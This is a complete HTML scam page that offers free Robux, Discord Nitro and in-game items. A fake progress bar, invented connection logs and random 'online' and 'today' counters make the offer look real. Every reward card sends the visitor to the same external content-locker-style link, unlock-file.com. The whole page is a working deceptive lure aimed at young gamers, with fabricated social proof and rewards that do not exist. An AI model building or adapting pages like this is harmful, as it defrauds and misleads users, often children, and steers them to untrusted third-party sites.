<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Earn Your Robux</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  background: radial-gradient(circle at top, #1a002b, #000);
  color: #fff;
  text-align: center;
}

/* container */
.container {
  max-width: 420px;
  margin: 25px auto;
  padding: 20px;
  background: rgba(255,255,255,0.05);
  border-radius: 20px;
  backdrop-filter: blur(10px);
  box-shadow: 0 0 40px rgba(0,0,0,0.6);
}

/* title */
h1 {
  margin: 10px 0;
  font-size: 22px;
}

/* animated stats */
.stats {
  font-size: 12px;
  opacity: 0.8;
  margin-bottom: 10px;
}

/* input */
input {
  width: 90%;
  padding: 12px;
  border-radius: 12px;
  border: none;
  margin-top: 10px;
  background: #111;
  color: #fff;
}

/* glowing button */
button {
  margin-top: 12px;
  padding: 12px 25px;
  border-radius: 12px;
  border: none;
  color: #fff;
  font-weight: bold;
  cursor: pointer;
  background: linear-gradient(90deg,#ff00cc,#3333ff);
  box-shadow: 0 0 15px #ff00cc;
  animation: glow 1.5s infinite alternate;
}

@keyframes glow {
  from { box-shadow: 0 0 10px #ff00cc; }
  to { box-shadow: 0 0 25px #3333ff; }
}

/* progress */
.progress {
  margin-top: 15px;
  height: 10px;
  background: #222;
  border-radius: 10px;
  overflow: hidden;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg,#00ffe0,#00aaff);
  transition: 0.3s;
}

/* logs */
.logs {
  margin-top: 10px;
  font-size: 12px;
  text-align: left;
  height: 90px;
  overflow-y: auto;
  background: #111;
  padding: 10px;
  border-radius: 10px;
}

/* cards grid */
.grid {
  margin-top: 15px;
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}

/* card */
.card {
  position: relative;
  background: linear-gradient(135deg,#1e1e1e,#2a2a2a);
  border-radius: 15px;
  padding: 15px;
  cursor: pointer;
  overflow: hidden;
  transition: 0.3s;
}

.card:hover {
  transform: scale(1.08);
}

/* shine effect */
.card::before {
  content: "";
  position: absolute;
  top: -100%;
  left: -100%;
  width: 200%;
  height: 200%;
  background: linear-gradient(120deg,transparent,rgba(255,255,255,0.3),transparent);
  transform: rotate(25deg);
  animation: shine 3s infinite;
}

@keyframes shine {
  0% { transform: translate(-100%,-100%) rotate(25deg); }
  100% { transform: translate(100%,100%) rotate(25deg); }
}

.card img {
  width: 60px;
}

.title {
  margin-top: 5px;
  font-size: 13px;
  font-weight: bold;
}

/* loader */
.loader {
  position: fixed;
  inset: 0;
  background: #000;
  display: none;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  font-size: 18px;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 6px solid #fff;
  border-top: 6px solid transparent;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 10px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.hidden { display: none; }
</style>
</head>

<body>

<div class="container">

  <h1>Earn Your Robux Now 🎁</h1>

  <div class="stats">
    👥 <span id="online">132</span> online • 🔥 <span id="today">9241</span> today
  </div>

  <input id="user" placeholder="Enter Roblox username">
  <br>
  <button onclick="start()">Connect</button>

  <div class="progress"><div class="bar" id="bar"></div></div>

  <div class="logs" id="logs"></div>

  <div id="options" class="hidden">
    <h3>🎁 Choose Your Rewards</h3>

    <div class="grid">
      <div class="card" onclick="go(1)">
        <img src="https://cdn.discordapp.com/emojis/1430727723105386516.png">
        <div class="title">1,200 Robux</div>
      </div>

      <div class="card" onclick="go(2)">
        <img src="https://cdn.discordapp.com/emojis/1430727723105386516.png">
        <div class="title">3,000 Robux</div>
      </div>

      <div class="card" onclick="go(3)">
        <img src="https://cdn.discordapp.com/emojis/1481984895059365938.gif">
        <div class="title">Nitro Booster Monthly</div>
      </div>

      <div class="card" onclick="go(4)">
        <img src="https://cdn.discordapp.com/emojis/1495702747629092926.png">
        <div class="title">Permanent Dragon</div>
      </div>
    </div>

  </div>

</div>

<div class="loader" id="loader">
  <div class="spinner"></div>
  <div>Processing...</div>
</div>

<script>
function log(msg){
  const l = document.getElementById("logs");
  l.innerHTML += msg + "<br>";
  l.scrollTop = l.scrollHeight;
}

function start(){
  let p = 0;
  let bar = document.getElementById("bar");

  const steps = ["Connecting...","Fetching data...","Preparing...","Finalizing..."];
  let i = 0;

  let int = setInterval(()=>{
    p += 25;
    bar.style.width = p+"%";

    if(i < steps.length){
      log(steps[i]);
      i++;
    }

    if(p>=100){
      clearInterval(int);
      document.getElementById("options").classList.remove("hidden");
    }
  },700);
}

/* animated stats */
setInterval(()=>{
  document.getElementById("online").innerText =
    Math.floor(100 + Math.random()*80);
  document.getElementById("today").innerText =
    Math.floor(8000 + Math.random()*3000);
},2000);

function go(id){
  document.getElementById("loader").style.display="flex";

  const links = {
    1:"https://unlock-file.com/?10ecf14",
    2:"https://unlock-file.com/?10ecf14",
    3:"https://unlock-file.com/?10ecf14",
    4:"https://unlock-file.com/?10ecf14"
  };

  setTimeout(()=>{
    window.location.href = links[id];
  },2000);
}
</script>

</body>
</html>
